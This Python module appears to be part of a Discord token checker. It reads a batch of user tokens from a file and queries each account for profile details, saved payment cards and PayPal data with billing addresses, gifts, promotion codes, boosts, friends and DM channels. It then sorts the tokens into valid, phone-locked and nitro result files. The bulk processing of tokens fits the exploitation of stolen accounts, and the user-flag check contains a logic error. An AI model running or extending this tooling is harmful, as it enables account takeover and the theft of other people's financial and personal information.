import os
from datetime import datetime
from re import findall
from typing import Any, Coroutine, Dict, List, Literal, Optional, Union

import aiofiles
from aiohttp import ClientSession
from json import load

pattern = r"\b[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b"
BASE_URL = "https://discord.com/"


def open_json(filename: str = "config.json"):
    return load(open(filename, "r"))


config = open_json()
friend_type = {
    1: "Friend",
    2: "Block",
    3: "incoming friend request",
    4: "outgoing friend request"
}
flags: Dict[int, str] = {
    1 << 0: "Staff Team",
    1 << 1: "Guild Partner",
    1 << 2: "HypeSquad Events Member",
    1 << 3: "Bug Hunter Level 1",
    1 << 5: "Dismissed Nitro promotion",
    1 << 6: "House Bravery Member",
    1 << 7: "House Brilliance Member",
    1 << 8: "House Balance Member",
    1 << 9: "Early Nitro Supporter",
    1 << 10: "Team Supporter",
    1 << 14: "Bug Hunter Level 2",
    1 << 16: "Verified Bot",
    1 << 17: "Early Verified Bot Developer",
    1 << 18: "Moderator Programs Alumni",
    1 << 19: "Bot uses only http interactions",
    1 << 22: "Active Developer"
}


async def custom_print(
    text: str,
    color: Literal["info", "debug", "error", "warn"] = "warn",
    print_: bool = False,
    write_file: bool = False,
    file: str = None,
) -> None:
    colors = {
        "info": f"\033[1;32;48m{text}\033[1;37;0m ",
        "debug": f"\033[1;34;48m{text}\033[1;37;0m",
        "error": f"\033[1;31;48m{text}\033[1;37;0m",
        "warn": f"\033[1;33;48m{text}\033[1;37;0m ",
    }
    if print_:
        print(colors[color])
    if write_file and file:
        await write_to_file(info=text, file=file)
    return colors[color]


def count_tokens() -> int:
    with open("tokens.txt", "r", errors="ignore") as file:
        lines = file.read()
    return len(findall(pattern, lines))


def gen_parse_token(tokens: str) -> tuple:
    token_ = findall(pattern, tokens)
    if len(token_) >= 1:
        return token_, len(token_)
    else:
        print("Please, input tokens in tokens.txt!")
        exit(0)


def get_user_flags(public_flags: int) -> List[str]:
    flags_all: list[str] = list()
    if config["show_flags"]:
        for key, value in flags.items():
            if (key and public_flags) == key:
                flags_all.append(value)
    else:
        flags_all.append('Enable "show_flags" feature in config.json!')

    return flags_all


def from_datetime_to_humanly(
    date: datetime,
    to_string: Union[datetime.strptime, str] = "%d.%m.%Y %H:%M:%S"
) -> str:
    return date.strftime(to_string)


def from_iso_format_to_humanly(iso: str, to_string: Union[datetime.strptime, str] = "%d.%m.%Y %H:%M:%S") -> str:
    date = datetime.fromisoformat(iso)
    return date.strftime(to_string)


def get_account_creation(snowflake_id: str, to_humanly: bool = True) -> Union[datetime, str]:
    user_creation = (int(snowflake_id) >> 22) + 1420070400000
    user_creation = datetime.fromtimestamp(user_creation / 1000.0)
    if to_humanly:
        user_creation = from_datetime_to_humanly(user_creation)
    return user_creation


async def get_tokens() -> tuple[Union[str, Any], int]:
    if not os.path.exists("tokens.txt"):
        print("please, create tokens.txt file!!")
        exit(0)
    async with aiofiles.open("tokens.txt", "r", errors="ignore") as file:
        lines = await file.read()
    for token in gen_parse_token(lines):
        return token


async def write_to_file(info: str, file: str) -> None:
    if config["write_tokens_to_file"]:
        async with aiofiles.open(file, "a+", encoding="utf-8", errors="ignore") as file:
            await file.write(f"{info}\n")

    return


async def check_nitro_credit(headers: Dict[Any, Any]) -> tuple[int, int]:
    dict_credits = {"classic_credits": 0, "boost_credits": 0}
    async with ClientSession(base_url=BASE_URL) as session:
        async with session.get("/api/v10/users/@me/applications/521842831262875670/entitlements?exclude_consumed=true",
                               headers=headers) as response:
            if response.status == 200:
                text = await response.text()
                dict_credits["classic_credits"] = text.count("Nitro Classic")
                dict_credits["boost_credits"] = text.count("Nitro Monthly")

    return dict_credits["classic_credits"], dict_credits["boost_credits"]


async def check_payments(headers: Dict[Any, Any]) -> List[str]:
    cc_digits = {"american express": "3", "visa": "4", "mastercard": "5"}
    account_cards, card = [], ""
    async with ClientSession(base_url=BASE_URL) as session:
        async with session.get("/api/v10/users/@me/billing/payment-sources", headers=headers) as response:
            if response.status == 200:
                search_billing = await response.json()

    for grab in search_billing:
        grab1 = grab["billing_address"]
        if grab["type"] == 1:
            cc_brand = grab["brand"]
            cc_first = cc_digits.get(cc_brand)
            cc_last = grab["last_4"]
            cc_month = str(grab["expires_month"])
            cc_year = str(grab["expires_year"])
            card = f"""
Payment Type: Credit card
Valid: {not grab["invalid"]}
CC Holder Name: {grab1["name"]}
CC Brand: {cc_brand.title()}
CC Number: {''.join(z if (i + 1) % 2 else f'{z} ' for i, z in
                    enumerate((cc_first if cc_first else '*')
                              + ('*' * 11) + cc_last))}
CC Date: {(f'0{cc_month}' if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4]}
Address 1: {grab1["line_1"]}
Address 2: {grab1["line_2"] if grab1["line_2"] else ''}
City: {grab1["city"]}
Postal code: {grab1["postal_code"]}
State: {grab1["state"] if grab1["state"] else ''}
Country: {grab1["country"]}
Default Payment Method: {grab['default']}\n"""
        elif grab["type"] == 2:
            card = f"""
Payment Type: PayPal
Valid: {not grab['invalid']}
PayPal Name: {grab1["name"]}
PayPal Email: {grab['email']}
Address 1: {grab1["line_1"]}
Address 2: {grab1["line_2"] if grab1["line_2"] else ''}
City: {grab1["city"]}
Postal code: {grab1["postal_code"]}
State: {grab1["state"] if grab1["state"] else ''}
Country: {grab1["country"]}
Default Payment Method: {grab['default']}\n"""
        account_cards.append(card)

    return account_cards


async def get_guilds(headers: Dict[Any, Any]) -> dict[str, list[str]]:
    guilds: dict[str, list[str]] = {}

    async with ClientSession(base_url=BASE_URL) as session:
        async with session.get("/api/v9/users/@me/guilds?with_counts=true", headers=headers) as response:
            if response.status == 200:
                r_json = await response.json()

                for guild in r_json:
                    guilds[guild["id"]] = [guild["name"], guild["owner"]]
    return guilds


async def get_gifts(headers: Dict[Any, Any]) -> List[str]:
    gifts = []

    async with ClientSession(base_url=BASE_URL) as session:
        async with session.get("/api/v10/users/@me/entitlements/gifts", headers=headers) as response:
            if response.status == 200:
                r_json = await response.json()

                for gift in r_json:
                    gifts.append(gift['subscription_plan']['name'])
    return gifts


async def get_me(headers: Dict[Any, Any]) -> Union[Coroutine[Any, Any, None], Dict[Any, Any], None, tuple[int, str]]:
    info = None
    async with ClientSession(base_url=BASE_URL) as session:
        async with session.get("/api/v10/users/@me", headers=headers) as response:
            if response.status == 200:
                info = await response.json()
            elif response.status == 401:
                return response.status, ""
            elif response.status == 403:
                return response.status, ""

    return response.status, info


async def get_connections(headers: Dict[Any, Any]) -> Dict[Any, Any]:
    connections = {}
    async with ClientSession(base_url=BASE_URL) as session:
        async with session.get("/api/v10/users/@me/connections", headers=headers) as response:
            if response.status == 200:
                info = await response.json()

    for connection in info:
        connection_type = connection["type"]
        name = connection["name"]
        shows_in_profile = connection["visibility"] == 1
        verified = connection["verified"]
        revoked = connection["revoked"]

        connections[connection_type] = [name, shows_in_profile, verified, revoked]

    return connections


async def get_promotions(headers: Dict[Any, Any], locale: Optional[str] = None) -> Dict[Any, Any]:
    promo_ = {}
    async with ClientSession(base_url=BASE_URL) as session:
        async with session.get(
                f"/api/v10/users/@me/outbound-promotions/codes?locale={locale if locale else 'us'}",
                headers=headers
        ) as response:
            if response.status == 200:
                res = await response.json()

    for result in res:
        name = result["promotion"]["outbound_title"]
        start_time = from_iso_format_to_humanly(result["promotion"]["start_date"])
        end_time = from_iso_format_to_humanly(result["promotion"]["end_date"])
        link_to = result["promotion"]["outbound_redemption_page_link"]
        code = result["code"]

        promo_[name] = [start_time, end_time, link_to, code]

    return promo_


async def check_boosts(headers: Dict[Any, Any]) -> Dict[Any, Any]:
    boosts = {}
    async with ClientSession(base_url=BASE_URL) as session:
        async with session.get("/api/v10/users/@me/guilds/premium/subscription-slots", headers=headers) as response:
            info = await response.json()

    for boost_info in info:
        boost_id = boost_info["id"]
        guild_id, ended = "Unused boost", False
        subscription_id = boost_info["subscription_id"]
        if boost_info.get("premium_guild_subscription") is None:
            boost_status = "Unused (maybe cooldown)"
        else:
            guild_id = boost_info["premium_guild_subscription"]["guild_id"]
            ended = boost_info["premium_guild_subscription"]["ended"]
            boost_status = "Used"
        canceled = boost_info["canceled"]
        cooldown_ends_at = "No cooldown" \
            if boost_info["cooldown_ends_at"] is None \
            else from_iso_format_to_humanly(boost_info["cooldown_ends_at"])

        boosts[boost_id] = [guild_id, ended, boost_status, canceled, cooldown_ends_at, subscription_id]

    return boosts


async def get_nitro_info(headers: Dict[Any, Any]) -> tuple[Union[str, None], Union[str, None]]:
    nitro_start, nitro_end = None, None

    async with ClientSession(base_url=BASE_URL) as session:
        async with session.get("/api/v10/users/@me/billing/subscriptions", headers=headers) as resp:
            if resp.status == 200:
                nitro_billing = await resp.json()

    if nitro_billing:
        nitro_start = from_iso_format_to_humanly(nitro_billing[0]["current_period_start"])
        nitro_end = from_iso_format_to_humanly(nitro_billing[0]["current_period_end"])

    return nitro_start, nitro_end


async def get_relationships(headers: Dict[Any, Any]) -> tuple[int, List[str]]:
    relationship_list = []

    async with ClientSession(base_url=BASE_URL) as session:
        async with session.get("/api/v10/users/@me/relationships", headers=headers) as resp:
            relationship_json = await resp.json()

    if relationship_json:
        for friend in relationship_json:
            user_flags = get_user_flags(friend['user']['public_flags'])
            user_id = friend['user']['id']
            user_name = friend['user']['username']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{friend['user']['avatar']}." \
                     f"{'gif' if str(friend['user']['avatar']).startswith('a_') else 'png'}" \
                if friend['user']["avatar"] else None
            relationship_list.append(f"""\n
[ ID ]: {user_id}
[ Avatar URL ]: {avatar}
[ Account Creation ]: {get_account_creation(user_id)}
[ Nickname ]: {friend['nickname'] if friend['nickname'] is not None else user_name}
[ Name#tag ]: {f'{user_name}#{friend["user"]["discriminator"]}'}
[ Friend type ]: {friend_type.get(friend['type'], 'Unknown')}
[ Flags ]: {', '.join(user_flags) if user_flags else 'No flags'}""")

    return len(relationship_list), relationship_list


async def get_dms(headers: Dict[Any, Any]) -> List[str]:
    direct_messages = []

    async with ClientSession(base_url=BASE_URL) as session:
        async with session.get("/api/v10/users/@me/channels", headers=headers) as resp:
            if resp.status == 200:
                dms_json = await resp.json()

    if dms_json:
        for i, dm in enumerate(dms_json):
            text = f"\nPrivate channel №{i + 1}\n[ ID ]: {dm['id']}\n" \
                   f"[ Friend type ]: {friend_type.get(dm['type'], 'Unknown')}" \
                   f"\n[ Last message id ]: {dm.get('last_message_id', None)}\n" \
                   f"[ Channel created at ]: {get_account_creation(dm['id'])}\n\n[ Recipients ]:\n"
            for recipient in dm['recipients']:
                user_flags = get_user_flags(recipient['public_flags'])
                user_id = recipient['id']
                user_name = recipient['username']
                discriminator = recipient['discriminator']
                avatar = (
                    f"https://cdn.discordapp.com/avatars/{user_id}/{recipient['avatar']}.",
                    f"{'gif' if str(recipient['avatar']).startswith('a_') else 'png'}"
                    if recipient.get("avatar", None)
                    else None
                )
                text += f"[ ID ]: {user_id}\n" \
                        f"[ Name#Tag: {f'{user_name}#{discriminator}'}\n" \
                        f"[ Avatar URL ]: {avatar}\n" \
                        f"[ Account Creation ]: {get_account_creation(user_id)}\n" \
                        f"[ Global Name ]: {recipient.get('global_name', user_name)}\n" \
                        f"[ Display Name ]: {recipient.get('display_name', user_name)}\n" \
                        f"[ Bot ]: {recipient.get('bot', False)}\n" \
                        f"[ Flags ]: {', '.join(user_flags) if user_flags else 'No flags'}\n\n"
            direct_messages.append(text)

    return direct_messages


def create_needed(time: datetime) -> Union[tuple[str, str, str, str], tuple[None, None, None, None]]:
    if config["write_tokens_to_file"]:
        files = ["valid_tokens.txt", "invalid_tokens.txt", "phonelock_tokens.txt", "nitro_tokens.txt"]
        res = from_datetime_to_humanly(date=time, to_string='%d.%m.%Y %H_%M_%S')
        os.makedirs(f"results/result-{res}")

        for file in files:
            with open(f"results/result-{res}/{file}", "w"):
                pass

        return f"results/result-{res}/{files[0]}", f"results/result-{res}/{files[1]}", \
            f"results/result-{res}/{files[2]}", f"results/result-{res}/{files[3]}"
    else:
        return None, None, None, None
